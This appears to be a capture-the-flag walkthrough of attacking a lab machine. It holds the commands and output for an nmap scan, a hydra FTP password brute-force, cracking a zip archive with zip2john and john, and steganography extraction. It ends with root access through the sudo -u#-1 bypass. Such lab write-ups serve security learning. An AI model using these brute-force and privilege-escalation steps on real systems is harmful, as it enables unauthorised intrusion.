'''
scanning and Enumeration  [nmap -sC -sV 10.10.230.143]

nmap:

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-13 10:07 UTC
Nmap scan report for 10.10.230.143
Host is up (0.34s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                                  
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)                  
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel




'''




'''
Redirect to secret page 'curl -H "user-agent:C" 10.10.230.143  -L'


''' Crack Ftp with hydra

hydra -l chris -P rockyou.txt ftp://10.10.230.143


Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-13 10:29:30
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.230.143:21/
[STATUS] 224.00 tries/min, 224 tries in 00:01h, 14344175 to do in 1067:17h, 16 active
[21][ftp] host: 10.10.230.143   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-13 10:30:41



'''
login ftp and download all files with mget

ftp 10.10.230.143
user :chris 
password : crystal


'''




'''

used binwalk to extract image 

binwalk -e .png


zip file was encrypted 

unencrypt with zip

convert to john from zip
/usr/sbin/zip2john 8702.zip > ola.txt
'''

''' unencrypt with zip 

john ola.txt

Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 10 candidates buffered for the current salt, minimum 16 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:02 DONE 2/3 (2020-10-13 10:52) 0.3891g/s 17115p/s 17115c/s 17115C/s 123456..Peter



'''

''' Read UNziped file ....decode from base64


echo "QXJlYTUx" > movement.txt
base64 -d movement.txt

decoded password: Area51


'''
steghide extract -sf cute-alien.jpg 
'''
using steghide to extract text from other image




Enter passphrase: 
wrote extracted data to "message.txt".
 
'''
 exploited the sudo machine 
sudo -u#-1 /bin/bash 

as a root user 

